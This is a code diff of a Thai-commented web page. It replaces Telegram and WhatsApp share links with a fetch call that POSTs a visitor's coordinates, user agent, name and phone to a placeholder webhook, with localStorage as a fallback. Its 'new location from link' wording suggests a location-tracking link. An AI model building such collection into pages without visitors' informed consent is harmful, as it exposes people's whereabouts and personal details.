@@ -411,8 +411,11 @@ https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.long
                 return;
             }
             
-            // สร้างข้อความที่จะส่งมาหาเรา
-            const ownerMessage = `🚨 ตำแหน่งใหม่จากลิงก์!
+            // ส่งข้อมูลไปยัง webhook ของคุณ
+            sendToWebhook(data);
+            
+            // สร้างข้อความยืนยัน
+            const confirmMessage = `✅ ส่งข้อมูลเรียบร้อยแล้ว!
             
 📍 ตำแหน่ง:
 ละติจูด: ${data.latitude.toFixed(6)}
@@ -424,33 +427,43 @@ https://www.google.com/maps?q=${data.latitude},${data.longitude}
 
 ⏰ เวลา: ${new Date(data.timestamp).toLocaleString('th-TH')}
 
-📱 ส่งจาก: ${data.userAgent}
-
-🌐 ลิงก์: ${data.url}
-
-${data.user ? `
-👤 ชื่อ: ${data.user.name}
-${data.user.phone ? `📞 เบอร์โทร: ${data.user.phone}` : ''}
-${data.user.message ? `💬 ข้อความ: ${data.user.message}` : ''}
-` : ''}
-
-📊 ข้อมูล JSON:
-${JSON.stringify(data, null, 2)}`;
+📊 ข้อมูลถูกบันทึกในระบบแล้ว`;
             
-            // ส่งมาหาเราโดยตรง
-            const encodedOwnerMessage = encodeURIComponent(ownerMessage);
-            const ownerTelegramUrl = `https://t.me/share/url?url=${encodedOwnerMessage}`;
-            const ownerWhatsappUrl = `https://wa.me/?text=${encodedOwnerMessage}`;
+            // แสดงข้อความยืนยัน
+            alert(confirmMessage);
+        }
+        
+        function sendToWebhook(data) {
+            // ส่งข้อมูลไปยัง webhook ของคุณ
+            const webhookUrl = 'https://your-webhook-url.com/webhook/location';
             
-            // ส่งไป Telegram ของเรา
-            setTimeout(() => {
-                window.open(ownerTelegramUrl, '_blank');
-            }, 1000);
-            
-            // ส่งไป WhatsApp ของเรา
-            setTimeout(() => {
-                window.open(ownerWhatsappUrl, '_blank');
-            }, 2000);
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('✅ ส่งข้อมูลไปยัง webhook เรียบร้อย:', result);
+            })
+            .catch(error => {
+                console.error('❌ เกิดข้อผิดพลาดในการส่งข้อมูล:', error);
+                // เก็บข้อมูลใน localStorage เป็น backup
+                saveToLocalStorage(data);
+            });
+        }
+        
+        function saveToLocalStorage(data) {
+            try {
+                const existingData = JSON.parse(localStorage.getItem('locationData') || '[]');
+                existingData.push(data);
+                localStorage.setItem('locationData', JSON.stringify(existingData));
+                console.log('💾 เก็บข้อมูลใน localStorage:', data);
+            } catch (error) {
+                console.error('❌ เกิดข้อผิดพลาดในการเก็บข้อมูล:', error);
+            }
         }
         
         function sendLocationData() {
